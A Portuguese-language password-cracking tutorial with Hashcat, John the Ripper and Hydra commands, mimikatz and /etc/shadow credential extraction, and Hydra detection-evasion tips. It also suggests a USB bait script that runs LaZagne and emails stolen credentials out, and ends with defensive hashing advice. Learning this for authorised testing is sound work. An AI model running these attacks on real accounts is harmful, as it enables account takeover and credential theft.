Hack de Senhas

Técnicas avançadas, ferramentas e métodos para teste de segurança de senhas

Introdução ao Hack de Senhas

A quebra de senhas é uma das técnicas fundamentais no arsenal de um profissional de segurança da informação. Compreender como os atacantes podem comprometer credenciais é essencial para criar sistemas seguros e proteger dados sensíveis.

Neste guia completo, você aprenderá sobre as principais ferramentas, técnicas e metodologias utilizadas para testes de segurança de senhas, desde ataques de força bruta até engenharia social, passando por técnicas avançadas como rainbow tables e ataques de dicionário.

AVISO IMPORTANTE: Todas as técnicas e ferramentas descritas neste guia são para fins educacionais e devem ser usadas apenas em ambientes controlados e com autorização explícita. A utilização destas técnicas sem permissão constitui crime e pode resultar em sérias consequências legais.

Conceitos Fundamentais

O que é um Hash?

Um hash é uma função matemática que converte dados de tamanho arbitrário em uma string de bits de tamanho fixo. Os hashes são fundamentais para o armazenamento seguro de senhas, pois:

  • São unidirecionais (não podem ser revertidos para a senha original)
  • A mesma entrada sempre produz o mesmo hash de saída
  • Pequenas alterações na entrada resultam em hashes completamente diferentes
  • É computacionalmente inviável encontrar duas entradas diferentes que produzam o mesmo hash (resistência a colisões)

Exemplos de Algoritmos de Hash: MD5, SHA-1, SHA-256, SHA-512, NTLM, bcrypt, Argon2

Salting (Uso de Sais)

Um "salt" é um valor aleatório que é combinado com a senha antes de aplicar a função hash. Os sais são cruciais para a segurança porque:

  • Previnem ataques com rainbow tables (tabelas pré-computadas)
  • Fazem com que senhas idênticas produzam hashes diferentes
  • Aumentam significativamente o custo computacional de ataques de força bruta

Armazenamento de Senhas

Os sistemas modernos armazenam senhas de maneiras específicas para garantir segurança:

  • Linux: Em /etc/shadow usando algoritmos como SHA-512 com salt
  • Windows: Na SAM (Security Accounts Manager) usando NTLM ou NTLMv2
  • Aplicações Web: Frequentemente usando bcrypt, Argon2 ou PBKDF2
  • Bancos de Dados: Colunas criptografadas com hashes e salts

Tipos de Ataques de Senha

Força Bruta
Testa todas as combinações possíveis de caracteres até encontrar a senha correta. Altamente eficaz, mas muito demorado para senhas complexas.
Dicionário
Utiliza uma lista de palavras comuns para tentar adivinhar a senha. Mais eficiente que força bruta, mas depende da qualidade do dicionário.
Híbrido
Combina ataques de dicionário com força bruta, adicionando caracteres especiais e números a palavras comuns.
Rainbow Tables
Utiliza tabelas pré-computadas para encontrar senhas a partir de seus hashes, trocando espaço de armazenamento por velocidade.
Spray de Senha
Tenta algumas senhas comuns em muitas contas diferentes, evitando bloqueios por excesso de tentativas.
Regras e Máscaras
Utiliza padrões e regras específicas para tentar variações de palavras-base, aumentando a eficiência do ataque.

Eficácia dos Ataques

A eficácia de um ataque de senha depende de vários fatores:

  • Complexidade da senha: Comprimento, uso de caracteres variados
  • Algoritmo de hash: Algoritmos antigos como MD5 são muito mais rápidos de quebrar
  • Uso de salts e iterações: Aumentam significativamente a dificuldade
  • Poder computacional: GPUs modernas são muito mais eficientes que CPUs para quebra de senhas
  • Tempo disponível: Alguns ataques podem levar dias, semanas ou mesmo anos
Tipo de Ataque Eficácia Velocidade Recurso Necessário
Força Bruta Alta (se houver tempo suficiente) Muito lenta Alto poder computacional
Dicionário Média (dependendo da wordlist) Rápida Boas wordlists
Rainbow Tables Alta (para hashes sem salt) Muito rápida Muito espaço de armazenamento
Híbrido Alta Média Boas regras e wordlists
Mask Attack Alta (com boas máscaras) Média Conhecimento do padrão de senha

Ferramentas Principais

Hashcat

Hashcat é a ferramenta de quebra de senha mais rápida do mundo, utilizando a potência de GPUs para acelerar o processo. Suporta mais de 300 tipos de hash e múltiplos modos de ataque.

Recursos Principais:

  • Suporte a GPU via OpenCL
  • Múltiplos modos de ataque (brute-force, mask, dictionary, rule-based, etc.)
  • Suporte a mais de 300 algoritmos de hash
  • Otimizado para alta performance
  • Modo distribuído para múltiplas máquinas
John the Ripper

John the Ripper é uma ferramenta de quebra de senha gratuita e de código aberto, inicialmente desenvolvida para sistemas Unix. É altamente configurável e suporta diversos formatos de hash.

Recursos Principais:

  • Detecta automaticamente o tipo de hash
  • Diversos modos de ataque integrados
  • Sistema de regras flexível
  • Versão Community com suporte a mais formatos
  • Capacidade de retomar ataques interrompidos
Hydra

Hydra é uma ferramenta de cracking de login online, capaz de realizar ataques contra numerosos protocolos, incluindo SSH, FTP, SMTP, HTTP(S) e muitos outros.

Recursos Principais:

  • Suporte a mais de 50 protocolos
  • Paralelização para acelerar ataques
  • Módulos extensíveis
  • Suporte a proxies e SOCKS
  • Possibilidade de restaurar sessões interrompidas
Ophcrack

Ophcrack é uma ferramenta especializada em quebrar senhas do Windows usando ataques de rainbow tables, particularmente eficaz contra hashes NTLM e LM.

Recursos Principais:

  • Interface gráfica intuitiva
  • Rainbow tables gratuitas e premium
  • Live CD para recuperação de senhas
  • Extração automática de hashes
  • Suporte a Windows XP até Windows 10
CeWL

CeWL (Custom Word List generator) é uma ferramenta Ruby que rastreia um URL específico para criar listas de palavras personalizadas baseadas no conteúdo do site, útil para ataques direcionados.

Recursos Principais:

  • Geração de wordlists personalizadas
  • Profundidade de rastreamento configurável
  • Filtros de tamanho mínimo de palavra
  • Inclui e-mails encontrados
  • Inclui meta tags para palavras-chave relevantes

Hashcat - Tutorial Completo

Instalação e Configuração

Hashcat é pré-instalado no Kali Linux, mas também pode ser instalado em outros sistemas:

Debian/Ubuntu
sudo apt update sudo apt install hashcat
Arch Linux
sudo pacman -S hashcat
Windows (PowerShell como Admin)
winget install hashcat

Para obter melhor performance, é altamente recomendável instalar os drivers mais recentes da sua GPU.

Verificando Suporte a Hardware

Verificar dispositivos disponíveis
hashcat --opencl-info
Verificar performance em benchmark
hashcat -b

Modos de Ataque

Hashcat oferece vários modos de ataque que podem ser especificados com a opção -a:

  • Modo 0: Ataque de Dicionário
  • Modo 1: Ataque de Combinação
  • Modo 3: Ataque de Máscara (Brute Force)
  • Modo 6: Ataque de Dicionário com Máscara
  • Modo 7: Ataque de Máscara com Dicionário

Tipos de Hash

Hashcat suporta centenas de tipos de hash. Para especificar o tipo, use a opção -m:

Tipos de hash comuns
# MD5: -m 0 # SHA1: -m 100 # SHA2-256: -m 1400 # SHA2-512: -m 1700 # MySQL: -m 300 # NTLM: -m 1000 # WPA/WPA2: -m 22000 # bcrypt: -m 3200 # Argon2: -m 16900
Listar todos os hashes suportados
hashcat --help | grep -i "Hash modes"

Exemplos Práticos de Uso do Hashcat

Ataque de Dicionário Básico (MD5)

Usando rockyou.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

No Kali Linux, a wordlist rockyou.txt está compactada em /usr/share/wordlists/. Para descompactá-la, use: gzip -d /usr/share/wordlists/rockyou.txt.gz

Ataque de Força Bruta com Máscara

Senhas de 8 caracteres (a-z, 0-9)
hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a?a?a
Padrão específico (3 letras + 5 números)
hashcat -m 1000 -a 3 hash.txt ?l?l?l?d?d?d?d?d

Tipos de caracteres em máscaras:

?l = letras minúsculas (a-z)
?u = letras maiúsculas (A-Z)
?d = dígitos (0-9)
?s = caracteres especiais (!@#$)
?a = todos os caracteres acima

Ataque com Regras

Usando regras best64
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
Usando regras OneRuleToRuleThemAll
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

Quebra de Senhas do Windows (NTLM)

Extraindo hashes com mimikatz (no Windows)
mimikatz # privilege::debug mimikatz # sekurlsa::logonpasswords
Quebrando hash NTLM
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

Quebra de Senhas WPA/WPA2

Convertendo cap para hccapx
cap2hccapx captura.cap saida.hccapx
Quebrando WPA/WPA2
hashcat -m 22000 -a 0 saida.hccapx /usr/share/wordlists/rockyou.txt

Quebra de Hash de Senha do Linux (/etc/shadow)

Extraindo hashes
unshadow /etc/passwd /etc/shadow > hashes.txt
Quebrando hashes SHA-512 (comum em sistemas modernos)
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

Otimizando o Desempenho

  • Use GPUs em vez de CPUs quando possível
  • Atualize para os drivers mais recentes
  • Ajuste as configurações de workload com -w (1-4)
  • Utilize a opção --opencl-device-types=1,2,3 para usar todos os dispositivos disponíveis
  • Ative o modo optimizado com -O (pode usar mais memória)
Configuração otimizada
hashcat -m 1000 -a 0 hash.txt wordlist.txt -w 3 -O --opencl-device-types=1,2,3

John the Ripper - Guia Detalhado

Instalação e Configuração

John the Ripper está disponível no Kali Linux por padrão, mas você pode querer a versão "jumbo" com mais recursos:

Debian/Ubuntu
sudo apt update sudo apt install john john-data
Versão Jumbo (Github)
git clone https://github.com/openwall/john.git cd john/src ./configure && make -s clean && make -sj4

Características do John the Ripper

  • Detecção automática de tipos de hash
  • Ataques de dicionário, brute force e baseados em regras
  • Suporte a múltiplos formatos de hash
  • Capacidade de retomar sessões interrompidas
  • Modo incremental para ataques de força bruta altamente configuráveis

Formato dos Arquivos de Hash

John the Ripper aceita diversos formatos de hash:

  • Formato simples: usuário:hash
  • Formato shadow: usuário:hash:últimaModificação:mínimo:máximo:aviso:inativo:expiração
  • Raw hashes: apenas o hash

Exemplos Práticos

Quebra de Senhas do Linux

Combinando arquivos passwd e shadow
sudo unshadow /etc/passwd /etc/shadow > hashes.txt
Quebrando com John
john hashes.txt
Usando wordlist específica
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Quebra de Hashes MD5

Formato do arquivo (hash.txt)
user1:5f4dcc3b5aa765d61d8327deb882cf99 user2:e99a18c428cb38d5f260853678922e03
Quebra com regras
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt

Quebra de Hashes do Windows (NTLM)

Formato do arquivo (ntlm.txt)
Administrator:500:LMHASH:NTHASH::: Guest:501:LMHASH:NTHASH:::
Quebra de hashes NTLM
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt

Ataque de Força Bruta Incremental

Usando modo incremental
john --incremental hash.txt
Força bruta com configuração específica
john --incremental=Digits --format=raw-md5 hash.txt

Usando Regras Personalizadas

Aplicando regras
john --wordlist=wordlist.txt --rules=Jumbo hash.txt
Arquivo de regras personalizado
john --wordlist=wordlist.txt --rules:meuarquivo hash.txt

Exibindo Senhas Quebradas

Ver senhas já quebradas
john --show hash.txt
Ver estatísticas da sessão
john --status

Utilizando John com ZIP, RAR e outros formatos

Extraindo hash de arquivo ZIP
zip2john arquivo.zip > zip.hash
Extraindo hash de arquivo RAR
rar2john arquivo.rar > rar.hash
Extraindo hash de arquivo PDF
pdf2john documento.pdf > pdf.hash
Quebrando o hash extraído
john zip.hash

Dicas para Otimização

  • Use a opção --fork=N para paralelizar o processamento em N threads
  • Use --session=nome para salvar o progresso e poder retomar depois
  • Use --pot=arquivo.pot para especificar um arquivo de potfile personalizado
  • Combine wordlists com regras para maior eficiência

Hydra - Ataques Online

Introdução ao Hydra

THC-Hydra é uma ferramenta de cracking de autenticação online, usada para realizar ataques de força bruta contra diversos serviços e protocolos. Ao contrário do Hashcat e John the Ripper que trabalham com hashes offline, o Hydra tenta autenticação direta em serviços online.

ATENÇÃO: Ataques online são facilmente detectáveis e podem bloquear contas, gerar logs e disparar alertas. Use apenas em ambientes autorizados para teste.

Instalação

Debian/Ubuntu/Kali
sudo apt update sudo apt install hydra

Protocolos Suportados

Hydra suporta dezenas de protocolos, incluindo:

  • HTTP(S), HTTP-FORM-POST, HTTP-PROXY
  • FTP, SSH, Telnet
  • SMTP, IMAP, POP3
  • SMB, RDP, VNC
  • MySQL, PostgreSQL, Oracle
  • E muitos outros
Listar todos os protocolos suportados
hydra -h | grep "Supported services"

Sintaxe Básica

Formato geral
hydra -l usuario -P wordlist.txt servico://servidor opcoes

Exemplos Práticos

Ataque SSH

Usuário único, múltiplas senhas
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
Múltiplos usuários, senha única
hydra -L usuarios.txt -p "senha123" ssh://192.168.1.100
Múltiplos usuários, múltiplas senhas
hydra -L usuarios.txt -P senhas.txt ssh://192.168.1.100

Ataque FTP

Ataque básico
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
Com porta específica
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100:2121

Ataque a Formulário Web

Atacando login HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:usuario=^USER^&senha=^PASS^:Falha no login"
Login HTTPS com parâmetros adicionais
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 -s 443 https-post-form "/login:username=^USER^&password=^PASS^&submit=Login:F=Login incorreto"

Ataque a WordPress

WordPress Admin
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorreto"

Atacando Serviços de Email

SMTP
hydra -l usuario@dominio.com -P /usr/share/wordlists/rockyou.txt smtp://mail.servidor.com
IMAP
hydra -l usuario@dominio.com -P /usr/share/wordlists/rockyou.txt imap://mail.servidor.com
POP3
hydra -l usuario@dominio.com -P /usr/share/wordlists/rockyou.txt pop3://mail.servidor.com

Opções Avançadas

Limitando Tentativas

Threads paralelas
hydra -l admin -P wordlist.txt -t 4 ssh://192.168.1.100
Tempo entre tentativas
hydra -l admin -P wordlist.txt -t 1 -W 3 ssh://192.168.1.100

Saída e Logging

Salvar resultados
hydra -l admin -P wordlist.txt ftp://192.168.1.100 -o resultados.txt
Saída em formato JSON
hydra -l admin -P wordlist.txt ftp://192.168.1.100 -o resultados.json -b json

Usando Proxies

Proxy SOCKS
hydra -l admin -P wordlist.txt ssh://192.168.1.100 -s 22 -x 4:127.0.0.1:9050

Dicas para Evitar Detecção e Bloqueio

  • Use valores baixos para threads (-t 1 ou -t 2)
  • Adicione tempo entre tentativas (-W 5 para 5 segundos)
  • Use listas menores e mais direcionadas
  • Utilize a opção -f para parar após encontrar a primeira credencial válida
  • Monitorar alertas e bloqueios para ajustar sua estratégia

Wordlists e Dicionários

Importância das Wordlists

Wordlists são coleções de palavras usadas em ataques de dicionário. A qualidade e relevância da wordlist é frequentemente o fator mais importante no sucesso de um ataque de senha.

Principais Wordlists

  • RockYou: Uma das mais famosas, contendo 14 milhões de senhas reais vazadas
  • SecLists: Coleção de múltiplas listas para diversos propósitos
  • CrackStation: Uma das maiores wordlists disponíveis publicamente
  • Weakpass: Contém senhas fracas comumente usadas
  • Wordlists específicas por idioma: Adaptadas para diferentes línguas e regiões
Localização no Kali Linux
/usr/share/wordlists/

Criando Wordlists Personalizadas

Usando CeWL para Web Scraping

Extrair palavras de um site
cewl -d 2 -m 6 -w wordlist.txt https://alvo.com.br

Parâmetros CeWL:

-d: profundidade de rastreamento (níveis)
-m: tamanho mínimo das palavras
-w: arquivo de saída

Usando CUPP (Common User Passwords Profiler)

Gerar wordlist baseada em informações pessoais
python3 cupp.py -i

O CUPP fará perguntas sobre a pessoa (nome, aniversário, informações de familiares, etc.) e gerará uma wordlist personalizada.

Manipulação de Wordlists

Remover duplicatas
sort wordlist.txt | uniq > wordlist_clean.txt
Filtrar por tamanho
cat wordlist.txt | grep -E '^.{8,12}$' > wordlist_8-12chars.txt
Combinar múltiplas wordlists
cat wordlist1.txt wordlist2.txt wordlist3.txt | sort | uniq > wordlist_combined.txt

Gerando Wordlists com Regras

Usando hashcat para aplicar regras
hashcat --force wordlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist_com_regras.txt
Usando John para aplicar regras
john --wordlist=wordlist.txt --rules=Jumbo --stdout > wordlist_john_rules.txt

Recursos Online de Wordlists

  • GitHub SecLists: github.com/danielmiessler/SecLists
  • CrackStation: crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
  • WeakPass: weakpass.com

Rainbow Tables

O que são Rainbow Tables?

Rainbow Tables são estruturas de dados pré-computadas que oferecem um compromisso entre tempo e espaço para recuperar senhas a partir de hashes. Elas permitem realizar uma busca rápida em uma vasta quantidade de hashes pré-calculados.

Como Funcionam

Rainbow Tables usam um conceito chamado "time-memory trade-off" (compromisso tempo-memória):

  1. Pré-computam cadeias de hash e redução em vez de todos os hashes possíveis
  2. Armazenam apenas os pontos finais dessas cadeias
  3. Durante a busca, re-computam cadeias parciais para encontrar correspondências

Isso reduz significativamente o espaço de armazenamento necessário, embora aumente um pouco o tempo de busca.

Ferramentas para Rainbow Tables

RainbowCrack

Instalação
sudo apt install rainbowcrack
Gerando tabelas (exemplo MD5)
rtgen md5 loweralpha-numeric 1 8 0 1000 1000000 0
Usando tabelas existentes
rcrack caminho/para/tabelas/ -h hash_para_quebrar

Ophcrack

Instalação
sudo apt install ophcrack ophcrack-tables

Ophcrack possui uma interface gráfica e é especializado em hashes do Windows. Também está disponível como Live CD para recuperação de senhas diretamente do sistema.

Limitações das Rainbow Tables

  • Saltings: As Rainbow Tables são ineficazes contra hashes que usam salt
  • Espaço de armazenamento: Tabelas completas podem ocupar terabytes
  • Algoritmos lentos: Não são eficientes contra algoritmos como bcrypt, Argon2
  • Conjunto limitado: Cada tabela cobre apenas um conjunto específico de caracteres e comprimentos

Devido ao uso generalizado de salt e algoritmos lentos em sistemas modernos, as Rainbow Tables têm uso limitado hoje em dia, exceto para alguns casos específicos como hashes antigos sem salt.

Quando Usar Rainbow Tables

As Rainbow Tables ainda são úteis em alguns cenários:

  • Hashes sem salt (alguns hashes MD5, SHA1 antigos)
  • Hashes NTLM do Windows (quando extraídos diretamente)
  • Análise forense de sistemas legados
  • Recuperação de senhas em dispositivos antigos

Engenharia Social e Ataques Psicológicos

Engenharia Social na Quebra de Senhas

A engenharia social é muitas vezes o método mais eficaz para obtenção de senhas, pois explora o "elo mais fraco" da segurança: o fator humano.

Técnicas Comuns

1. Phishing

Criação de páginas falsas de login idênticas às legítimas para capturar credenciais.

Ferramentas como o SET (Social Engineering Toolkit) e Gophish são usadas para criar campanhas de phishing controladas em testes de segurança.

Iniciando o SET no Kali
sudo setoolkit

2. Pretexting

Criar uma narrativa falsa para obter informações ou acesso.

  • Fingir ser suporte técnico
  • Impersonar funcionários de autoridade
  • Criar situações de "emergência" que exigem quebra de protocolo

3. Baiting

Deixar dispositivos infectados (como pen drives) em locais estratégicos, esperando que alguém os conecte.

Criando USB malicioso com LaZagne
sudo apt install auto-run-on-insert # Crie um script que execute LaZagne e envie resultados via email/FTP

4. Shoulder Surfing

Observar diretamente quando alguém digita sua senha ou usa dispositivos.

Ferramentas de Coleta de Informações

Maltego

Ferramenta de inteligência e forensics que permite mapear relações entre pessoas, empresas e informações online.

Instalação do Maltego
sudo apt install maltego

theHarvester

Coleta emails, nomes, subdomínios, IPs e URLs de diversas fontes públicas.

Exemplo básico
theHarvester -d empresa.com.br -b google,linkedin

Sherlock

Encontra contas de usuários em redes sociais usando o nome de usuário.

Instalação e uso
git clone https://github.com/sherlock-project/sherlock.git cd sherlock python3 -m pip install -r requirements.txt python3 sherlock nomeusuario

Aplicação na Criação de Wordlists Personalizadas

As informações coletadas por engenharia social podem ser usadas para criar wordlists altamente eficazes:

Usando CUPP com informações coletadas
python3 cupp.py -i # Inserir informações coletadas: nome, data de nascimento, nomes de filhos, animal de estimação, etc.

Mitigação e Defesas

  • Treinamento regular de conscientização de segurança
  • Implementação de autenticação de múltiplos fatores (MFA)
  • Políticas claras sobre compartilhamento de informações
  • Verificação de identidade através de canais secundários
  • Sistemas de detecção de phishing

Proteção e Mitigação

Melhores Práticas para Armazenamento de Senhas

Algoritmos Recomendados

  • Argon2: Vencedor da competição Password Hashing Competition (2015), resistente a ataques de GPU
  • bcrypt: Desenho à prova de ataques por GPU, com fator de custo ajustável
  • PBKDF2: Padrão aprovado pelo NIST, com iterações configuráveis
  • scrypt: Algoritmo memory-hard, resistente a hardware especializado

Algoritmos obsoletos que NÃO devem ser usados: MD5, SHA-1, SHA-256 (sem salt ou iterações), DES, 3DES.

Parâmetros Importantes

  • Salt: Único para cada usuário, pelo menos 16 bytes aleatórios
  • Iterações/Fator de Trabalho: Configurado para levar aproximadamente 100-500ms por operação
  • Uso de Memória (para Argon2/scrypt): O máximo possível dentro das restrições do servidor
  • Paralelismo: Ajustado conforme os núcleos disponíveis no servidor

FAQ - Perguntas Frequentes

O que é mais eficiente: CPU ou GPU para quebra de senhas?

GPUs são significativamente mais eficientes para quebra de senhas devido à sua capacidade de processamento paralelo massivo. Uma GPU moderna pode ser 50-100x mais rápida que uma CPU de alta performance para algoritmos como MD5 ou SHA1. No entanto, alguns algoritmos como bcrypt e Argon2 são projetados para serem resistentes a ataques de GPU, reduzindo essa vantagem.

Quanto tempo leva para quebrar uma senha de 8 caracteres?

O tempo varia drasticamente dependendo da complexidade da senha e do hardware utilizado. Com uma GPU moderna:

  • 8 caracteres numéricos (MD5): segundos a minutos
  • 8 caracteres alfanuméricos (MD5): horas a dias
  • 8 caracteres com maiúsculas, minúsculas, números e símbolos (MD5): dias a semanas
  • 8 caracteres com maiúsculas, minúsculas, números e símbolos (bcrypt): anos

Isso demonstra a importância de escolher algoritmos lentos como bcrypt ou Argon2 para armazenamento de senhas.

É possível reverter um hash para obter a senha original?

Não, funções de hash são unidirecionais por design. Não é possível "reverter" o hash para obter a senha original. Os ataques de quebra de senha funcionam tentando diferentes senhas, gerando o hash de cada uma e comparando com o hash alvo. Quando há uma correspondência, a senha foi encontrada.

Quais são os sinais de que minha senha foi comprometida?

Alguns sinais incluem:

  • Atividade não reconhecida em suas contas
  • Emails de confirmação de login de locais desconhecidos
  • Alterações em configurações que você não fez
  • Recebimento de notificações sobre redefinição de senha que você não solicitou
  • Sua conta de email sendo usada para enviar spam

Você pode verificar se seus dados foram expostos em vazamentos conhecidos usando serviços como Have I Been Pwned.

Qual é a senha mais segura que posso criar?

As senhas mais seguras são:

  • Longas: pelo menos 16 caracteres
  • Complexas: combinação de letras maiúsculas, minúsculas, números e símbolos
  • Únicas: diferentes para cada serviço
  • Aleatórias: sem padrões reconhecíveis ou palavras de dicionário
  • Gerenciáveis: use um gerenciador de senhas para não precisar memorizá-las

Uma técnica eficaz é usar frases-senha: sequências de palavras aleatórias com símbolos intercalados, como "cavalo-bateria-grampo-nuvem!42".
